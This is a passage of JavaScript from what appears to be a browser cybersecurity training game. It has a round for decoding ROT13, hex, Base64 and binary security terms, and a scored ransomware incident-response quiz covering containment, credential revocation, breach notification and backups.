 ['ROT13','ONPXQBBE',['backdoor'],'ROT13. O becomes B, N becomes A, P becomes C.'],
 ['HEX','7061796c6f6164',['payload'],'Hex to ASCII. 70 is 112, which is p.'],
 ['BASE64','bGF0ZXJhbCBtb3ZlbWVudA==',['lateral movement'],'Two words. What an attacker does after the first foothold.'],
 ['BINARY','01110010 01101111 01101111 01110100',['root'],'Four characters. The account everyone is trying to reach.'],
 ['ROT13','CRAGRFG',['pentest'],'C becomes P, R becomes E, A becomes N.'],
 ['HEX','62656163306e',['beac0n'],'Note the zero. Attackers substitute characters to dodge naive string matching.'],
 ['BASE64','cGVyc2lzdGVuY2U=',['persistence'],'The tactic that keeps access alive after the first door is closed.']
];
function decode(){
  var q=shuffle(PAY); G.total=q.length; hud();
  function step(){
    if(G.round>=q.length){
      return finish(G.score>=520?'Decoder clean':'Session complete',
        G.score>=520?'These four encodings cover most of what turns up in obfuscated payloads and C2 traffic.'
                   :'Base64 ends in padding. Hex comes in pairs. Binary comes in eights. Once you see the shape the rest is mechanical.');
    }
    var p=q[G.round]; G.round++; hud();
    play.innerHTML='<p class="rg-q">Intercepted payload. Encoding: <b style="color:var(--mint)">'+p[0]+'</b></p>'+
      '<div class="rg-panel" style="font-family:var(--m);font-size:1rem;text-align:center;letter-spacing:1px;color:var(--mint);word-break:break-all">'+p[1]+'</div>'+
      '<input id="dc" style="width:100%;padding:12px 14px;font-family:var(--m);font-size:.92rem;border-radius:8px;border:1px solid var(--line);background:var(--surf2);color:var(--ice);outline:none" placeholder="decoded value..." autocomplete="off" spellcheck="false">'+
      '<div class="rg-opts" style="margin-top:12px"><button class="rg-o" id="sub">Submit</button></div>'+
      '<div class="rg-fb" id="fb"></div>';
    var inp=document.getElementById('dc'); inp.focus();
    var done=false;
    function ans(timeout){
      if(done)return;
      var v=(inp.value||'').trim().toLowerCase();
      var ok=p[2].some(function(x){return v===x});
      if(!ok&&!timeout){
        G.streak=0; award(-10); 
        var f=document.getElementById('fb');
        f.className='rg-fb on bad'; f.innerHTML='<b>Not it.</b> Try again before the timer runs out.';
        return;
      }
      done=true; stop();
      if(ok){G.streak++;award(90+Math.min(G.streak,5)*15)}else{G.streak=0;hud()}
      var fb=document.getElementById('fb');
      fb.className='rg-fb on '+(ok?'good':'bad');
      fb.innerHTML='<b>'+(ok?'Decoded.':'Time. It was "'+p[2][0]+'".')+'</b> '+p[3];
      var n=document.createElement('button');n.className='rg-next';n.textContent='Next payload';
      n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
    }
    document.getElementById('sub').onclick=function(){ans(false)};
    inp.onkeydown=function(e){if(e.key==='Enter')ans(false)};
    countdown(20000,function(){ans(true)});
  }
  step();
}

/* ══════ 6. INCIDENT COMMAND ══════ */
var SCEN=[
 {t:'03:12. EDR flags mass file encryption on three servers in the finance segment. What is your first move?',
  o:[['Start restoring from backup immediately',-1,'Restoring while the attacker still has access means they encrypt your restored data too. Containment comes first.'],
     ['Isolate the three hosts from the network',2,'Correct. Contain before you investigate. Stopping the spread is worth more than any evidence you might lose.'],
     ['Email the whole company a warning',0,'Not harmful, but it is not containment and it tips off an attacker who is still inside.']]},
 {t:'Isolation holds. Your EDR shows the same parent process on eleven more hosts, not yet encrypting. Next?',
  o:[['Isolate all eleven now',2,'Right. Those are staged. You have a narrow window before the payload fires on them too.'],
     ['Watch them to gather intelligence',-1,'Intelligence is worth nothing if eleven more servers encrypt while you are taking notes.'],
     ['Run a full AV scan on each',0,'Slow, and signature scanning will likely miss what EDR already surfaced behaviourally.']]},
 {t:'Containment is holding. Where do you look first to understand how they got in?',
  o:[['VPN and identity authentication logs',2,'Correct. Most ransomware begins with valid credentials on remote access. Start where the door is.'],
     ['The encrypted files themselves',-1,'The encrypted files tell you what happened at the end, not how it started.'],
     ['The ransom note',0,'Useful for attribution and for knowing which group you are dealing with, but it does not tell you the entry vector.']]},
 {t:'A VPN account authenticated from an unfamiliar country nine days ago, then daily since. The user is on leave. Action?',
  o:[['Disable the account and revoke all sessions',2,'Both halves matter. Disabling without revoking sessions leaves existing tokens live.'],
     ['Reset the password',0,'Necessary but not sufficient. Active session tokens survive a password reset.'],
     ['Wait until the user returns to confirm',-1,'Nine days of unauthorised access is not something you sit on for a confirmation call.']]},
 {t:'You find 40 GB was uploaded to external storage six days ago. Legal asks whether this is a notifiable breach. You say:',
  o:[['Yes, if personal data was in scope, and the clock started when we became aware',2,'Correct. Under the Data Protection Act the 72 hours runs from awareness, not from resolution.'],
     ['No, because we contained it',-1,'Containment does not undo exfiltration. The data is gone regardless of what you did afterwards.'],
     ['Let me check what was in the transfer first',1,'Reasonable instinct, and you do need scope, but do not let scoping delay starting the notification clock.']]},
 {t:'Executive asks whether to pay. What do you tell them?',
  o:[['Payment does not guarantee deletion and it funds the next attack',2,'The honest answer. Decryption keys often fail, and published victims frequently paid.'],
     ['Pay, it is cheaper than the downtime',-1,'It is also an unverifiable promise from a criminal enterprise, and it marks you as a paying target.'],
     ['That is a business decision, not mine',1,'True, but they asked for your input. Give them the facts they need to decide well.']]},
 {t:'Recovery is underway. What is the one control that would most reduce the impact of a repeat?',
  o:[['Immutable backups with separate credentials',2,'This is the answer. It removes the attacker leverage entirely by making the backups untouchable.'],
     ['A more expensive EDR product',0,'EDR caught this one. The failure was that the backups were reachable.'],
     ['More frequent user awareness training',1,'Valuable, and worth doing, but it reduces likelihood rather than impact.']]}
];
function cmd(){
  G.total=SCEN.length; hud();
  function step(){
    if(G.round>=SCEN.length){
      var max=SCEN.length*2*60;
      var pct=G.score/max;
      return finish(pct>=.85?'Commanded well':(pct>=.6?'Incident survived':'Costly night'),
        pct>=.85?'Contain, then investigate, then notify honestly. You got the sequence right and you did not let pressure push you into the wrong call.'
        :pct>=.6?'You recovered, but a couple of decisions cost time or evidence. Read the feedback on the ones that stung.'
        :'Under pressure the instinct is to fix. The discipline is to contain first and be honest second. Run it again.');
    }
    var s=SCEN[G.round]; G.round++; hud();
    play.innerHTML='<p class="rg-q">'+s.t+'</p><div class="rg-opts" style="flex-direction:column">'+
      s.o.map(function(o,i){return '<button class="rg-o" data-v="'+i+'" style="text-align:left;flex:none;width:100%">'+o[0]+'</button>'}).join('')+
      '</div><div class="rg-fb" id="fb"></div>';
    var done=false;
    play.querySelectorAll('.rg-o').forEach(function(b){
      b.onclick=function(){
        if(done)return; done=true; stop();
        var i=+b.dataset.v, o=s.o[i];
        play.querySelectorAll('.rg-o').forEach(function(x){x.disabled=true});
        b.classList.add(o[1]===2?'ok':'no');
        if(o[1]===2){G.streak++;award(120)}
        else if(o[1]===1){G.streak=0;award(50);hud()}
        else if(o[1]===0){G.streak=0;award(20);hud()}
        else {G.streak=0;hud()}
        var fb=document.getElementById('fb');
        fb.className='rg-fb on '+(o[1]===2?'good':'bad');
        fb.innerHTML='<b>'+(o[1]===2?'Right call.':(o[1]>=0?'Partly.':'That cost you.'))+'</b> '+o[2];
        var n=document.createElement('button');n.className='rg-next';n.textContent='Continue';
        n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
      };
    });
    countdown(26000,function(){
      if(done)return; done=true;
      G.streak=0; hud();
      var fb=document.getElementById('fb');
      fb.className='rg-fb on bad';
      fb.innerHTML='<b>You hesitated.</b> In a live incident, no decision is itself a decision. '+s.o.filter(function(x){return x[1]===2})[0][2];
      play.querySelectorAll('.rg-o').forEach(function(x){x.disabled=true});
      var n=document.createElement('button');n.className='rg-next';n.textContent='Continue';
      n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
    });
  }
  step();
}

})();
</script>
